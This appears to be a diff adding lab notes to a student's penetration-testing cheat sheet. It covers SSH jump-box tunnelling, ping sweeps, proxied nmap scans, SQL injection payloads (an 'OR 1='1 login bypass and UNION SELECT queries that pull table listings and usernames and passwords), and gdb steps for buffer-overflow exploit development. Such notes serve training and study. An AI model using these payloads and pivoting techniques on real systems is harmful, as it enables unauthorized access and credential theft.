@@ -270,7 +270,67 @@ Windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 
 
 
 
-Web exploitation
+Web exploitation 
+ ## Set up Jump Box
+  2 
+  3 ssh -MS /tmp/jump student@10.50.35.241
+  4 
+  5 ## Ping
+  6 for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+  7 
+  8 ssh -S /tmp/jump jump -O forward -D9050
+  9 
+ 10 proxychains nmap -Pn -T4 192.168.28.1,97,111,120,129
+ 11 
+ 12 
+ 13 ## press control r and search name and change to cancel
+ 14 ## tunnel example: ssh -S /tmp/jump jump -O forward -L 2121:192.168.28.100:80 -L 3333:192.168.28.100:2222
+ 15 
+ 16 ## ssh -MS /tmp/T1 creds@127.0.0.1 -p 3333
+ 17 
+ 18 ## SQL Commands ##
+ 19 SELECT Extracts data from a database
+ 20 
+ 21 UNION SELECT Used to combine the result-set of two or more SELECT statements
+ 22 
+ 23 USE Selects the DB to use
+ 24 Commands: commands must end with ;
+ 25 # mysql ;
+ 26 # show databases ;
+ 27 **********************
+ 28 DEFAULT DATABASES
+ 29 information_schema
+ 30 mysql
+ 31 performance schema
+ 32 ***********************
+ 33 # use information_schema ;
+ 34 # show tables ;
+ 35 # show columns from columns ;
+ 36 TABLE SCHEMA
+ 37 TABLE NAME
+ 38 COLUMN NAME
+ 39 ************************
+ 40 # select table_schema,table_name,column_name from information_schema.columns ;
+ 41 # select username,passwd,studentID from session.userinfo ;
+ 42 SQL BYPASS 'OR 1='1
+ 43 
+ 44 Audi 'UNION SELECT table_schema,2, table_name,column_name,5 from information_schema.columns #
+ 45 UNION SELECT type,2,cost,color,year from session.car
+
+Exploit Devlopment:::
+
+
+disass <FUNCTION>   #   Disassemble portion of the program
+info <...>  #   Supply info for specific stack areas
+x/256c $<REGISTER>  #   Read characters from specific register
+break <address>  #   Establish a break point
+UNSET ENV 
+gdb) unset env COLUMNS
+(gdb) unset env LINES
+show env
+have to overflow first before running these commands
+#find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+info proc map
 
 
 
